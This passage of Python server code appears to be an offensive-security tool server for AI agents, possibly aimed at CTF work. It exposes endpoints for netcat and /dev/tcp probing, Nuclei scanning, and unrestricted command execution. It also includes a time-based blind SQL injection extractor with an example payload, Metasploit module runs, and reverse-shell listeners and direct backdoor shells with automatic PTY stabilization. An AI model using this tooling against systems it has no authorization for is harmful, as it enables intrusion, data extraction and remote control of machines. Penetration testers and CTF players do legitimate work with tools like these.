    else:
        cmd = f"nc -n -w {timeout} -v {shlex.quote(req.host)} {req.port} 2>&1 </dev/null"

    result = await run_command(cmd, timeout=timeout + 5)

    # Strategy 2: bash /dev/tcp fallback (avoids nc differences across distros)
    if not result["stdout"] and not result.get("stderr", "").strip():
        bash_data = data if data else "\r\n"
        cmd2 = (
            f"BASH_DATA={shlex.quote(bash_data)} timeout {timeout} bash -c "
            f"'exec 3<>/dev/tcp/{shlex.quote(req.host)}/{req.port}; "
            f"printf \"%b\" \"$BASH_DATA\" >&3; "
            f"sleep 1; "
            f"cat <&3'"
            f" 2>&1 || true"
        )
        result2 = await run_command(cmd2, timeout=timeout + 2)
        if result2["stdout"] or result2["stderr"]:
            result = result2
            result["method"] = "bash_devtcp"

    # Strategy 3: Traditional nc without -v for cleaner output
    if not result["stdout"] and not result["stderr"]:
        cmd3 = f"printf '%b' {shlex.quote(data or chr(13)+chr(10))} | nc -w {timeout} {shlex.quote(req.host)} {req.port}"
        result3 = await run_command(cmd3, timeout=timeout + 2)
        if result3["stdout"] or result3["stderr"]:
            result = result3
            result["method"] = "nc_basic"

    # Check if we got connection refused / timeout in stderr (valid diagnostic)
    stderr_lower = (result.get("stderr") or "").lower()
    if not result["stdout"] and not result["stderr"]:
        result["diagnostic"] = "no_banner_received"
        result["suggestion"] = (
            f"Port {req.port} did not return a banner. This can mean: "
            "(1) Port is closed/filtered, (2) Service requires specific handshake, "
            "(3) Banner takes longer than timeout. Try data_to_send with protocol-specific greeting "
            f"or increase timeout (current: {timeout}s)."
        )
    elif "connection refused" in stderr_lower:
        result["diagnostic"] = "connection_refused"
        result["suggestion"] = f"Port {req.port} is closed on {req.host}."
    elif "timed out" in stderr_lower or result.get("timed_out"):
        result["diagnostic"] = "connection_timeout"
        result["suggestion"] = f"Connection to {req.host}:{req.port} timed out — host may be down or port filtered."
    else:
        result["diagnostic"] = "banner_received"

    return ojson(result)


@app.post("/api/tools/nuclei")
async def nuclei_scan(req: NucleiReq):
    """
    Run Nuclei vulnerability scanner.
    Supports shorthand scan types and full custom template selection.
    Returns JSON output (parsed) + raw stdout.
    """
    # Check if nuclei is installed
    binary = shutil.which("nuclei")
    if not binary:
        return ojson({
            "stdout": "", "stderr": "nuclei not found. Install: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
            "return_code": 127, "success": False, "timed_out": False, "elapsed_sec": 0,
            "diagnostic": "binary_missing",
            "suggestion": "Install nuclei or use apt install nuclei (Kali/Parrot)",
        })

    # Update templates if needed (non-blocking, fast check)
    update_flag = ""
    if not req.template_dir:
        # Check common nuclei template locations (v2: ~/nuclei-templates, v3: ~/.local/share/nuclei/)
        tpl_paths = [
            Path.home() / "nuclei-templates",
            Path.home() / ".local" / "share" / "nuclei",
            Path.home() / ".config" / "nuclei",
        ]
        if not any(p.exists() for p in tpl_paths):
            update_flag = "-update-templates "

    # Build command
    import shlex
    cmd = f"nuclei -target {shlex.quote(req.target)}"
    cmd += f" -rate-limit {req.rate_limit}"
    cmd += f" -concurrency {req.concurrency}"
    cmd += f" -timeout {req.timeout_secs}"

    # Scan type shortcuts
    SCAN_PRESETS = {
        "full":      "",  # run all templates
        "cves":      "-tags cve",
        "misconfig": "-tags misconfig",
        "exposure":  "-tags exposure",
        "dns":       "-tags dns",
        "tech":      "-tags tech",
        "fuzz":      "-tags fuzz",
        "panels":    "-tags panels",
        "vuln":      "-tags vuln",
        "default":   "",
    }
    if req.scan_type and req.scan_type.lower() in SCAN_PRESETS:
        preset = SCAN_PRESETS[req.scan_type.lower()]
        if preset:
            cmd += f" {preset}"

    # Template selection
    if req.templates:
        # Could be IDs like 'cves/2021/CVE-2021-44228' or paths
        for tpl in req.templates.split(","):
            tpl = tpl.strip()
            if tpl:
                cmd += f" -t {shlex.quote(tpl)}"

    if req.template_dir:
        cmd += f" -t {shlex.quote(req.template_dir)}"

    # Severity filter
    if req.severity:
        cmd += f" -severity {req.severity}"

    # Tags
    if req.tags:
        cmd += f" -tags {req.tags}"

    # JSON output for structured parsing
    json_out = f"/tmp/nuclei_{uuid.uuid4().hex[:6]}.json"
    cmd += f" -jsonl -o {json_out}"
    cmd += f" {update_flag}"
    cmd += f" {req.additional_args}"

    logger.info(f"Nuclei command: {_redact(cmd)}")
    if req.background:
        bg = await start_background_job(cmd, track="nuclei")
        bg["nuclei_json"] = json_out
        return ojson(bg)
    result = await _run_or_background(cmd, track="nuclei")
    if result.get("auto_backgrounded"):
        result["nuclei_json"] = json_out
        return ojson(result)
    # Parse JSON output
    parsed_findings = []
    try:
        if os.path.exists(json_out):
            with open(json_out) as f:
                for line in f:
                    line = line.strip()
                    if line:
                        try:
                            parsed_findings.append(json.loads(line))
                        except json.JSONDecodeError:
                            pass
            os.remove(json_out)
    except Exception as e:
        result["json_parse_error"] = str(e)

    result["nuclei_findings"] = parsed_findings[:100]
    result["finding_count"] = len(parsed_findings)
    result["findings_truncated"] = len(parsed_findings) > 100
    if result.get("stdout") and len(result["stdout"]) > 12000:
        result["stdout"] = result["stdout"][:12000] + "\n...[trimmed]"

    # Auto-save high/critical findings with dedup
    # FIX: guard against malformed template output — 'info' may be missing or
    # not a dict; one bad line previously 500'd the whole scan.
    for finding in parsed_findings:
        if not isinstance(finding, dict):
            continue
        info = finding.get("info") or {}
        if not isinstance(info, dict):
            info = {}
        sev = str(info.get("severity", "info") or "info").lower()
        if sev in ("high", "critical"):
            template_id = finding.get("templateID", finding.get("template-id", ""))
            finding_name = info.get("name", "Nuclei finding")
            await _db.save_finding(
                req.target, "nuclei", "vuln",
                finding_name,
                detail=json.dumps(finding),
                severity=sev,
                raw_output=json.dumps(finding),
                scan_command=_redact(cmd),  # FIX: nuclei -H header creds landed raw
            )

    return ojson(result)


# ─────────────────────────────────────────────
# Background Scan Job API
# Detached execution so sqlmap/ffuf/nmap never hit the 300s MCP timeout.
# ─────────────────────────────────────────────
@app.post("/api/scan/start")
async def scan_start(req: ScanStartReq):
    """Launch ANY command as a detached background job. Returns immediately.
    Progress is parsed from the log via _parse_progress (sqlmap char X/Y,
    ffuf %, hydra attempts, gobuster found, nuclei findings, etc.)."""
    if not req.command or not req.command.strip():
        raise HTTPException(400, "command is required")
    return ojson(await start_background_job(req.command, track=req.track, env=req.env))


async def _job_or_404(job_id: str) -> JobTracker:
    """Resolve a job from the in-memory registry, falling back to the DB
    (covers the 'server restarted mid-scan' case where the process is gone
    but the log file + DB row persist)."""
    job = _jobs.get(job_id)
    if job is not None:
        return job
    db_row = await _db.get_job(job_id)
    if not db_row:
        raise HTTPException(404, f"Job {job_id} not found")
    # Reconstruct a read-only tracker so status/wait can still return the tail
    ghost = JobTracker(job_id, db_row.get("command", ""), db_row.get("log_path", ""),
                       track=db_row.get("track", ""))
    ghost._alive = False
    ghost.proc = None
    ghost.pid = None
    # FIX: derive elapsed time from the DB row so restarted-ghost jobs report
    # real durations instead of ~0s (started_at was reset at reconstruction)
    started = db_row.get("started_at")
    if started:
        try:
            ts = datetime.fromisoformat(started)
            if ts.tzinfo is None:
                ts = ts.replace(tzinfo=timezone.utc)
            elapsed = max((datetime.now(timezone.utc) - ts).total_seconds(), 0)
            ghost.started_at = time.monotonic() - elapsed
        except Exception:
            pass
    return ghost


@app.get("/api/scan/{job_id}/status")
async def scan_status(job_id: str, tail_bytes: int = 4096):
    """Get live status + parsed progress + log tail for a background job.
    This is the diagnostic surface: tells you exactly what was running when
    you check (e.g. 'sqlmap: char 14/32 blind extraction, last=4f')."""
    tail_bytes = max(min(tail_bytes, 65536), 0)  # clamp: context-safety guard
    job = await _job_or_404(job_id)
    return ojson(await job.status(tail_bytes=tail_bytes))


@app.post("/api/scan/{job_id}/wait")
async def scan_wait(job_id: str, req: ScanWaitReq):
    """Block until the job finishes OR req.timeout elapses — whichever first.
    Polls status internally so no single HTTP call exceeds the MCP ceiling.
    Returns the final result (full stdout) if done, or current partial status
    if it timed out (clearly flagged with finished=False)."""
    job = await _job_or_404(job_id)
    deadline = time.monotonic() + max(req.timeout, 1)
    last_status: Dict[str, Any] = {}
    while time.monotonic() < deadline:
        last_status = await job.status(tail_bytes=req.tail_bytes)
        if last_status.get("finished"):
            # Job done — return output windowed so a multi-MB log (dirb with a
            # big wordlist, ffuf -p 10000 lines, etc.) can't blow the agent's
            # context. The full log stays paged via /api/scan/{id}/output.
            full = await job.read_full_output()
            w = _window_output(full)
            payload: Dict[str, Any] = {
                "job_id":      job_id,
                "finished":    True,
                "exit_code":   last_status.get("exit_code"),
                "stdout":      w["text"],
                "success":     last_status.get("exit_code") == 0,
                "elapsed_sec": last_status.get("elapsed_sec"),
                "progress":    last_status.get("progress"),
                "tail":        last_status.get("tail"),
            }
            if w["truncated"]:
                payload["stdout_truncated"] = True
                payload["stdout_len"] = w["len"]
                payload["omitted_chars"] = w["omitted"]
                payload["page_hint"] = f"/api/scan/{job_id}/output?offset_bytes=0"
            return ojson(payload)
        await asyncio.sleep(max(req.poll_interval, 1))
    # Timed out waiting — return partial status so caller knows where it is
    last_status = last_status or await job.status(tail_bytes=req.tail_bytes)
    return ojson({
        "job_id":     job_id,
        "finished":   False,
        "timed_out":  True,
        "message":    f"Job still running after {req.timeout}s. Poll /api/scan/{job_id}/status for updates.",
        **last_status,
    })


@app.get("/api/scan/list")
async def scan_list():
    """List all background jobs (active + finished) with parsed progress."""
    out = []
    # In-memory (active) jobs first — FIX: copy the items, start_background_job
    # inserts into the same dict while we await status() and 'dictionary
    # changed size during iteration' 500s under any concurrent scan_start.
    for jid, tracker in list(_jobs.items()):
        out.append(await tracker.status(tail_bytes=512))
    # DB-only jobs (finished or orphaned by restart) not already in memory
    seen = set(_jobs.keys())
    for row in await _db.list_jobs():
        if row["job_id"] in seen:
            continue
        out.append({
            "job_id":     row["job_id"],
            "command":    row.get("command", ""),
            "track":      row.get("track", ""),
            "log_path":   row.get("log_path", ""),
            "alive":      False,
            "finished":   row.get("finished_at") is not None,
            "exit_code":  row.get("exit_code"),
            "started_at": row.get("started_at"),
            "finished_at": row.get("finished_at"),
        })
    return ojson({"jobs": out, "count": len(out)})


@app.delete("/api/scan/{job_id}")
async def scan_kill(job_id: str):
    """Kill a running background job and mark it finished."""
    job = _jobs.pop(job_id, None)
    if job is None:
        # Maybe it's a DB-only ghost — mark finished regardless
        # FIX: don't overwrite a genuine exit code with -9 on finished jobs
        db_row = await _db.get_job(job_id)
        if db_row:
            if db_row.get("finished_at") is None:
                await _db.finish_job(job_id, -9)
            return ojson({"killed": job_id, "note": "was not in memory (likely already finished or server restarted)"})
        raise HTTPException(404, f"Job {job_id} not found")
    # FIX: report the truth instead of payloading "-9" for a job that already
    # finished on its own — kill() only SIGTERMs/SIGKILLs while still running,
    # but callers saw exit_code=-9 even for finished jobs.
    was_running = job.proc is not None and job.proc.returncode is None
    await job.kill()
    return ojson({"killed": job_id, "was_running": was_running,
                  "exit_code": -9 if was_running else job.proc.returncode})


@app.get("/api/scan/{job_id}/output")
async def scan_output(job_id: str, offset_bytes: int = 0, max_bytes: int = 20000):
    """Page through a job's full log file by byte offset — the AI-friendly way
    to read the middle of a huge scan log that /wait windowed out. Works for
    finished jobs too (the log file persists across restarts)."""
    job = await _job_or_404(job_id)
    if not job.log_path:
        raise HTTPException(404, f"Job {job_id} has no log file")
    max_bytes = max(min(max_bytes, 200000), 1024)
    offset_bytes = max(offset_bytes, 0)
    try:
        f = open(job.log_path, "rb")
    except FileNotFoundError:
        raise HTTPException(404, f"Log file missing: {job.log_path}")
    except OSError as e:
        raise HTTPException(500, f"Cannot open log: {e}")
    with f:
        total = f.seek(0, 2)
        f.seek(offset_bytes)
        raw = f.read(max_bytes)
    chunk = _strip_ansi(raw.decode("utf-8", errors="replace"))
    next_offset = offset_bytes + len(raw)
    return ojson({
        "job_id":          job_id,
        "offset":          offset_bytes,
        "chunk":           chunk,
        "next_offset":     min(next_offset, total),
        "total_bytes":     total,
        "finished":        next_offset >= total,
        "remaining_bytes": max(total - next_offset, 0),
    })


# ─────────────────────────────────────────────
# Time-based blind SQL injection extraction helper
# Runs the binary search SERVER-SIDE so one MCP call returns the full string,
# instead of ~224 manual curl/SLEEP round-trips.
# ─────────────────────────────────────────────
@app.post("/api/tools/blind_extract")
async def blind_extract(req: BlindExtractReq):
    """
    Extract a string via time-based blind SQLi using SLEEP-based binary search.

    payload_template MUST contain {pos} (1-indexed character position) and {val}
    (the comparison threshold). {sleep} is auto-filled from the `sleep` param.
    Example payload_template:
      "user=admin' AND IF(ASCII(SUBSTRING((SELECT flag FROM secrets),{pos},1))>{val},SLEEP({sleep}),0)-- -"

    The condition is treated as TRUE when the request takes
    >= baseline + sleep*(true_threshold-1) seconds (the SLEEP fired →
    ASCII(char) > val); baseline is measured per-run with a zeroed-sleep
    probe (RTT-adaptive — the old absolute bar false-negatived every
    probe against low-RTT targets).
    """
    import httpx as _httpx

    if "{pos}" not in req.payload_template or "{val}" not in req.payload_template:
        raise HTTPException(400, "payload_template must contain {pos} and {val} placeholders")
    if req.sleep <= 0:
        raise HTTPException(400, "sleep must be > 0")
    if req.true_threshold <= 1.0:
        raise HTTPException(400, "true_threshold must be > 1 (bar = RTT baseline + sleep*(threshold-1))")
    if req.char_min > req.char_max:
        raise HTTPException(400, "char_min must be <= char_max")
    if req.concurrency < 1 or req.concurrency > 64:
        raise HTTPException(400, "concurrency must be 1..64")
    # FIX3: the DoS trinity — end_pos / max_len / start_pos were unvalidated:
    # end_pos=1_000_000 built a ~1M-task asyncio.gather (OOM, single worker).
    if req.start_pos < 1:
        raise HTTPException(400, "start_pos must be >= 1")
    if req.end_pos < req.start_pos:
        raise HTTPException(400, "end_pos must be >= start_pos")
    if req.end_pos > 1024:
        raise HTTPException(400, "end_pos capped at 1024 (strings longer than 1KB need a length_payload + pagination)")
    if req.max_len < 1 or req.max_len > 1024:
        raise HTTPException(400, "max_len must be 1..1024")
    if req.request_timeout < 1 or req.request_timeout > 300:
        raise HTTPException(400, "request_timeout must be 1..300s")
    if req.sleep < 0.05 or req.sleep > 60:
        raise HTTPException(400, "sleep must be 0.05..60s")
    if req.max_retries < 0 or req.max_retries > 10:
        raise HTTPException(400, "max_retries must be 0..10")
    if len(req.payload_template) > 65536 or len(req.url) > 8192 or len(req.data) > 65536:
        raise HTTPException(400, "payload_template/data capped at 64KB, url at 8KB")

    if "{sleep}" not in req.payload_template:
        # Allow payloads that hard-code the sleep; still inject {sleep} for the template
        tmpl = req.payload_template
    else:
        tmpl = req.payload_template.replace("{sleep}", str(req.sleep))
    start_time = time.monotonic()
    requests_made = {"n": 0}

    # Persistent client for connection reuse (10x faster than fresh per request)
    client_http = _httpx.AsyncClient(timeout=req.request_timeout, verify=False)
    network_errors = {"n": 0}

    async def _send(val: int, pos: int, tmpl_: str = tmpl) -> float:
        """Render the payload for (pos, val), send one request, return elapsed seconds.
        Returns -1.0 when ALL attempts failed with network errors (distinct from a
        fast 'false' response) so callers can surface it instead of misreading it."""
        rendered = tmpl_.replace("{pos}", str(pos)).replace("{val}", str(val))
        attempts = 0
        while attempts < max(req.max_retries, 1):
            attempts += 1
            requests_made["n"] += 1
            t0 = time.monotonic()
            try:
                if req.method.upper() == "POST":
                    # FIX: data= (not content=) so httpx sends x-www-form-urlencoded —
                    # apps reading $_POST/request params previously received nothing.
                    body = (req.data + "&" + rendered) if req.data else rendered
                    await client_http.post(req.url, data=body, headers=req.headers)
                else:
                    # GET: append rendered payload as query string.
                    # FIX: httpx parses '#' as a URL fragment and silently strips
                    # it (MySQL inline comments like '-- -' + '#' are canonical
                    # SQLi) — pre-encode so the target actually receives it.
                    sep = "&" if "?" in req.url else "?"
                    full_url = req.url + sep + rendered.replace("#", "%23")
                    await client_http.get(full_url, headers=req.headers)
            except Exception as e:
                network_errors["n"] += 1
                logger.debug(f"blind_extract request error (val={val},pos={pos}): {e}")
                continue
            return time.monotonic() - t0
        return -1.0  # all attempts failed with network errors

    # C1 FIX: the old decision bar (elapsed >= sleep*true_threshold) is
    # ABSOLUTE — with defaults 0.5/1.5 a TRUE probe takes RTT+0.5s and only
    # crosses 0.75s if RTT >= 0.25s. Against localhost/CTF targets (RTT
    # ~1ms) every probe reads FALSE → real flags extract as empty strings.
    # Measure the RTT baseline with a zeroed-sleep probe (SLEEP({sleep}) ->
    # SLEEP(0) so the condition can never fire) and classify against
    # bar = baseline + sleep*(threshold-1), which is RTT-adaptive.
    # FIX2: zero via the {sleep} PLACEHOLDER, never str(req.sleep) — a
    # literal replace corrupted every payload containing the digits of the
    # sleep value (sleep=0.5 mangles "10.0.5.1", sleep=2 mangles "port=22").
    # Templates without {sleep} (hardcoded sleep) can't be zeroed: skip the
    # baseline and use the absolute bar.
    baseline = None
    # FIX3: gate on the PRE-substitution template — `tmpl` already had
    # {sleep} replaced above (3133), so `"{sleep}" in tmpl` was always
    # False and the RTT-adaptive baseline NEVER ran (dead code falling
    # back to the absolute bar). Build the zeroed probe from
    # req.payload_template before substitution.
    if "{sleep}" in req.payload_template:
        baseline = await _send(0, 0, req.payload_template.replace("{sleep}", "0"))
    if baseline is not None and baseline >= 0:
        bar = baseline + req.sleep * (req.true_threshold - 1)
    else:
        bar = req.sleep * req.true_threshold   # hardcoded-sleep template or network trouble

    async def _binary_search_position(pos: int) -> Optional[int]:
        """Binary-search the ASCII code of the char at `pos`.
        Returns -1 for network failure (ALL retries exhausted), None when the
        position is past end-of-string. FIX: distinct sentinels so a network
        error can never truncate the string as if it were a genuine EOS."""
        # REAL sanity probe (the old code only documented it, never sent it):
        # val = char_min - 1 is TRUE for any printable char (ASCII >= char_min
        # > char_min - 1), so a slow probe proves a char exists here — including
        # a space (ASCII 32), which the old code misread as end-of-string and
        # silently truncated the extracted string.
        probe = await _send(req.char_min - 1, pos)
        if probe < 0:
            return -1  # network errors — position unknown
        if probe < bar:
            return None  # past end of string
        lo, hi = req.char_min, req.char_max
        while lo < hi:
            mid = (lo + hi) // 2
            elapsed = await _send(mid, pos)
            if elapsed < 0:
                return -1
            if elapsed >= bar:
                lo = mid + 1   # ASCII > mid → search upper half
            else:
                hi = mid       # ASCII <= mid → search lower half
        return lo

    # Optional phase 1: binary-search the string length
    length = None
    if req.length_payload:
        if "{pos}" not in req.length_payload or "{val}" not in req.length_payload:
            raise HTTPException(400, "length_payload must contain {pos} and {val}")
        # FIX: length probes now go through _send (retries + network-error
        # counting) and merge req.data exactly like the extraction probes.
        ltmpl = req.length_payload.replace("{sleep}", str(req.sleep))
        lo, hi = 1, req.max_len
        triggered = False
        while lo < hi:
            mid = (lo + hi + 1) // 2  # bias up to converge correctly
            elapsed = await _send(mid, 1, ltmpl)
            if elapsed < 0:
                length = None  # network trouble — fall back to end_pos
                break
            if elapsed >= bar:
                triggered = True
                lo = mid   # length > mid → search upper
            else:
                hi = mid - 1
        else:
            length = lo if triggered else 0
        end_pos = length if length is not None else req.end_pos
    else:
        end_pos = req.end_pos

    # Phase 2: extract each character with bounded concurrency
    positions = list(range(req.start_pos, end_pos + 1))
    semaphore = asyncio.Semaphore(max(req.concurrency, 1))
    per_position: List[Dict[str, Any]] = []

    async def _do_pos(pos: int) -> Dict[str, Any]:
        async with semaphore:
            code = await _binary_search_position(pos)
            return {"pos": pos, "code": code,
                    "char": chr(code) if (code is not None and code >= 0) else None,
                    "network_error": code == -1}

    try:
        results = await asyncio.gather(*[_do_pos(p) for p in positions])
    finally:
        # FIX: close the client even when the request is cancelled (client
        # disconnect) — the old code leaked the connection pool on cancel.
        try:
            await client_http.aclose()
        except Exception:
            pass

    # Assemble extracted string (stop at first None if stop_on_no_trigger)
    extracted_chars = []
    for r in sorted(results, key=lambda x: x["pos"]):
        if r["code"] is None:
            if req.stop_on_no_trigger:
                break
            else:
                extracted_chars.append("?")
                r["char"] = "?"
                per_position.append(r)
                continue
        if r["code"] == -1:
            extracted_chars.append("?")  # network error — unknown char
            per_position.append(r)
            continue
        extracted_chars.append(chr(r["code"]))
        per_position.append(r)

    extracted = "".join(extracted_chars)
    elapsed = round(time.monotonic() - start_time, 2)

    return ojson({
        "extracted":        extracted,
        "length":           length if length is not None else len(extracted),
        "positions_scanned": len(per_position),
        "requests_made":    requests_made["n"],
        "network_errors":   network_errors["n"],
        "elapsed_sec":      elapsed,
        "method":           req.method,
        "sleep":            req.sleep,
        # full per-position log can be thousands of entries — keep last 50
        "per_position":     per_position[-50:],
        "per_position_total": len(per_position),
    })


# ─────────────────────────────────────────────
# Request Templates — save crafted HTTP requests for replay
# (e.g. X-Forwarded-For injection point) so you don't squeeze them
# into --headers on every call.
# ─────────────────────────────────────────────
@app.post("/api/templates/save")
async def templates_save(req: TemplateSaveReq):
    """Save (or upsert) a named request template."""
    if not req.name:
        raise HTTPException(400, "name is required")
    await _db.save_template(req.name, req.method, req.url, req.headers,
                      req.data, req.additional_args)
    return ojson({"saved": req.name, "method": req.method, "url": req.url})


@app.get("/api/templates")
async def templates_list():
    """List all saved request templates (name + method + url + updated)."""
    return ojson({"templates": await _db.list_templates()})


@app.get("/api/templates/{name}")
async def templates_get(name: str):
    """Get one saved request template by name."""
    t = await _db.get_template(name)
    if not t:
        raise HTTPException(404, f"Template '{name}' not found")
    return ojson({"template": t})


@app.post("/api/templates/{name}/run")
async def templates_run(name: str, req: TemplateRunReq):
    """Run a saved request template through the (fixed) curl endpoint.
    Any field in req overrides the saved template's value."""
    t = await _db.get_template(name)
    if not t:
        raise HTTPException(404, f"Template '{name}' not found")
    merged = {
        "url":            req.url if req.url is not None else t.get("url", ""),
        "method":         req.method if req.method is not None else t.get("method", "GET"),
        "headers":        req.headers if req.headers is not None else t.get("headers", {}),
        "data":           req.data if req.data is not None else t.get("data", ""),
        "additional_args": req.additional_args if req.additional_args is not None
                            else t.get("additional_args", "-sk"),
        "encode_url":     req.encode_url,
    }
    if not merged["url"]:
        raise HTTPException(400, "Template has no URL and none was provided")
    # Reuse the fixed curl endpoint logic
    import shlex
    url = _encode_url_safe(merged["url"]) if merged["encode_url"] else merged["url"]
    headers = " ".join(f"-H {shlex.quote(f'{k}: {v}')}" for k, v in merged["headers"].items())
    data = f"-d {shlex.quote(merged['data'])}" if merged["data"] else ""
    cmd = f"curl {merged['additional_args']} -X {merged['method']} {headers} {data} {shlex.quote(url)}"
    logger.info(f"Template run '{name}': {_redact(cmd)}")
    result = await run_command(cmd)
    result["template"] = name
    result["resolved_request"] = merged
    if result.get("stdout") and len(result["stdout"]) > 20000:
        out = result["stdout"]
        result["stdout"] = out[:20000] + f"\n...[trimmed {len(out)} bytes total]"
        result["body_truncated"] = True
    return ojson(result)


@app.delete("/api/templates/{name}")
async def templates_delete(name: str):
    """Delete a saved request template."""
    deleted = await _db.delete_template(name)
    if not deleted:
        raise HTTPException(404, f"Template '{name}' not found")
    return ojson({"deleted": name})


@app.post("/api/tools/metasploit")
async def metasploit(req: MetasploitReq):
    """
    Run metasploit module via resource script (non-interactive) OR
    start an interactive msfconsole PTY session.
    """
    if req.interactive:
        # Start interactive msfconsole PTY session
        # FIX: msfconsole absent → create_subprocess_exec can't find it; the
        # wrapper execvp fails silently and leaves a dead session. Guard first.
        if not shutil.which("msfconsole"):
            raise HTTPException(400, "msfconsole not found. Install metasploit: sudo apt install metasploit-framework")
        sid = str(uuid.uuid4())[:8]
        sess = PTYSession(sid, "msfconsole", "metasploit")
        await sess.start(["msfconsole", "-q"])
        _pty_sessions[sid] = sess
        await _db.save_finding("metasploit", "msfconsole", "exploit", f"Interactive msfconsole session started",
                         scan_command="msfconsole -q")
        # Wait for prompt — real msfconsole prompt after ANSI strip is "msf6 > "
        banner = await sess.read(timeout=30, wait_for="msf6 >")
        return ojson({"session_id": sid, "banner": banner, "message": "Interactive msfconsole started. Use /api/session/send and /api/session/read"})

    # Non-interactive resource script
    # FIX: "run -j" + sleep 5 truncated slow modules (no output captured) —
    # wait 20s so the module output lands before exit
    resource_lines = [f"use {req.module}"]
    for k, v in req.options.items():
        resource_lines.append(f"set {k} {v}")
    resource_lines.append("run -j")
    resource_lines.append("sleep 20")
    resource_lines.append("exit -y")
    rc_file = f"/tmp/mcp_msf_{uuid.uuid4().hex[:6]}.rc"
    Path(rc_file).write_text("\n".join(resource_lines))
    cmd = f"msfconsole -q -r {rc_file} 2>&1"
    try:
        result = await run_command(cmd)
    finally:
        # FIX: remove the rc file even when run_command raises (timeout/kill)
        try:
            os.remove(rc_file)
        except Exception:
            pass
    if result["stdout"]:
        await _db.save_finding("metasploit", "msfconsole", "exploit",
                         f"Metasploit: {req.module}", raw_output=result["stdout"],
                         scan_command=f"msfconsole -q -r {rc_file}")
        if len(result["stdout"]) > 20000:
            result["stdout"] = result["stdout"][:20000] + "\n...[trimmed]"
    return ojson(result)


# ─────────────────────────────────────────────
# PTY Interactive Session API
# netcat listener, msfconsole, bash, socat
# ─────────────────────────────────────────────
@app.post("/api/session/create")
async def session_create(req: SessionCreateReq):
    """
    Create an interactive PTY session.
    Types:
      netcat_listen  — nc -lvnp <port>  (waits for reverse shell)
      msfconsole     — interactive msfconsole
      bash           — local bash shell
      socat          — socat TCP listener with full TTY
    """
    sid = str(uuid.uuid4())[:8]
    sess = PTYSession(sid, req.type, req.target)

    if req.type == "netcat_listen":
        # BUG-007 FIX: Add -w timeout flag so nc doesn't hang forever
        cmd = ["nc", "-lvnp", str(req.port), "-w", "300"]
    elif req.type == "msfconsole":
        cmd = ["msfconsole", "-q"]
    elif req.type == "bash":
        cmd = ["/bin/bash", "--norc"]
    elif req.type == "socat":
        # socat with full TTY — best for CTF reverse shells
        # BUG-FIX: Use SYSTEM: instead of EXEC:'...' for more robust quoting
        cmd = ["socat", f"TCP-LISTEN:{req.port},reuseaddr,fork", "SYSTEM:/bin/bash -li,pty,stderr,setsid,sigint,sane"]
    elif req.type == "direct_shell":
        # Direct shell: connects OUTWARD to target:port (e.g. vsftpd backdoor on 6200)
        if not req.target:
            raise HTTPException(400, "direct_shell requires 'target' (IP to connect to)")
        sess.metadata["shell_type"] = "direct"
        sess.metadata["target_host"] = req.target
        # Prefer socat with PTY for full interactive shell; fall back to nc
        if shutil.which("socat"):
            cmd = ["socat", "-,raw,echo=0", f"tcp:{req.target}:{req.port}"]
        else:
            cmd = ["nc", req.target, str(req.port)]
    else:
        raise HTTPException(400, f"Unknown session type: {req.type}")

    # FIX: guard the binary before spawning — a missing one (nc/socat/msfconsole)
    # would otherwise leave a dead PTY session behind with no diagnostic
    binary = cmd[0] if cmd else ""
    if binary and not shutil.which(binary):
        raise HTTPException(400, f"Session binary not found: {binary}. Install it on the server first.")

    await sess.start(cmd)
    _pty_sessions[sid] = sess

    # For msfconsole, wait up to 30s for the prompt; others get 5s
    init_timeout = 30.0 if req.type == "msfconsole" else 5.0
    init_wait_for = "msf6 >" if req.type == "msfconsole" else None
    initial_output = await sess.read(timeout=init_timeout, wait_for=init_wait_for)

    # Auto-stabilize: run PTY upgrade sequence automatically for shell sessions
    stabilize_output = None
    if req.auto_stabilize and req.type in ("netcat_listen", "direct_shell", "socat"):
        logger.info(f"Auto-stabilizing session {sid} ({req.type})")
        upgrade_cmds = [
            "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "export TERM=xterm-256color",
            "export SHELL=bash",
            "stty rows 50 columns 200",
        ]
        # FIX: for listeners the client hasn't connected yet — sending the
        # upgrade commands immediately just dumped them into a dead PTY buffer.
        # Wait for the connection/shell to actually exist first.
        if req.type == "netcat_listen":
            conn_out = await sess.read(timeout=20.0, wait_for="Connection received")
            if not conn_out:
                logger.info(f"Session {sid}: no incoming connection yet — skipping auto-stabilize")
                return ojson({
                    "session_id":     sid,
                    "type":           req.type,
                    "status":         "active",
                    "initial_output": initial_output,
                    "metadata":       sess.metadata,
                    "auto_stabilized": False,
                    "stabilize_steps": None,
                    "message":        "Listener active, no connection yet. Use /api/session/send after the client connects.",
                    "tip": "For netcat: wait for 'Connection received', then use session_send. Auto-stabilize will not run until a client connects.",
                })
        elif req.type == "direct_shell":
            # Give the outbound connection a moment to present a shell prompt
            await asyncio.sleep(1.5)
            await sess.read(timeout=3.0)
        stabilize_steps = []
        for ucmd in upgrade_cmds:
            await sess.send(ucmd)
            out = await sess.read(timeout=2.0)
            stabilize_steps.append({"cmd": ucmd, "output": out})
        stabilize_output = stabilize_steps
        sess.metadata["shell_type"] = "stabilized"
        logger.info(f"Session {sid} auto-stabilized")

    return ojson({
        "session_id":     sid,
        "type":           req.type,
        "status":         "active",
        "initial_output": initial_output,
        "metadata":       sess.metadata,
        "auto_stabilized": stabilize_output is not None,
        "stabilize_steps": stabilize_output,
        "message":        f"Session started. Use /api/session/send to interact.",
        "tip": (
            "For msfconsole: wait for 'msf6>' prompt, then send commands. "
            "For netcat: wait for 'Connection received', then send shell commands."
        ),
    })

@app.post("/api/session/send")
async def session_send(req: SessionSendReq):
    """Send a command to an interactive PTY session and read the response."""
    sess = _pty_sessions.get(req.session_id)
    if not sess:
        raise HTTPException(404, f"Session {req.session_id} not found")
    if not sess.alive:
        raise HTTPException(400, f"Session {req.session_id} is no longer alive")

    await sess.send(req.command)
    output = await sess.read(
        timeout=req.read_timeout,
        wait_for=req.wait_for or None,
    )
    if output and len(output) > 16000:
        # cat /etc/shadow / find / -type f etc. dump unbounded bytes
        output = output[:16000] + "\n...[trimmed]"
    return ojson({
        "session_id": req.session_id,
        "sent":       req.command,
        "output":     output,
        "alive":      sess.alive,
    })

@app.post("/api/session/read")
async def session_read(req: SessionReadReq):
    """Read pending output from a PTY session without sending."""
    sess = _pty_sessions.get(req.session_id)
    if not sess:
        raise HTTPException(404, f"Session {req.session_id} not found")
    output = await sess.read(timeout=req.timeout)
    if output and len(output) > 16000:
        output = output[:16000] + "\n...[trimmed]"
